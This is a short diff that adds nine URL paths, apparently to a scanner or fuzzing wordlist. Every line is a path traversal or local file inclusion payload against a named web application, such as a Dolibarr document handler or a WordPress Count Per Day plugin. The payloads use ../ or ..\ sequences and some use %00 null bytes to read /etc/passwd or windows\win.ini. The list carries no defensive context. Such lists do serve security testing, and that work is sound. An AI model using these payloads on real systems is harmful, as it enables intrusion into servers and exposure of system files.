@@ -1,0 +1,9 @@
+/document.php?modulepart=project&file=../../../../../../../etc/passwd
+/wp-content/plugins/count-per-day/download.php?n=1&f=/etc/passwd
+/index.php?r=i/../../../../../etc/passwd
+/contrib/acog/print_form.php?formname=../../../etc/passwd%00
+/index.php?class=../../../../../../../etc/passwd%00
+/learn/cubemail/filemanagement.php?action=dl&f=../../../../../../../../../../../etc/passwd%00
+/controlcenter.php?opt=contents/Files&dir=%2Fetc&ffile=passwd&opmod=open
+/?h=44ea8a6603cbf54e245f37b4ddaf8f36&page=vlf&action=edit&fileName=..\..\..\windows\win.ini
+/source/loggin/page_log_dwn_file.hsp?h=44ea8a6603cbf54e245f37b4ddaf8f36&action=download&fileName=..\..\..\windows\win.ini
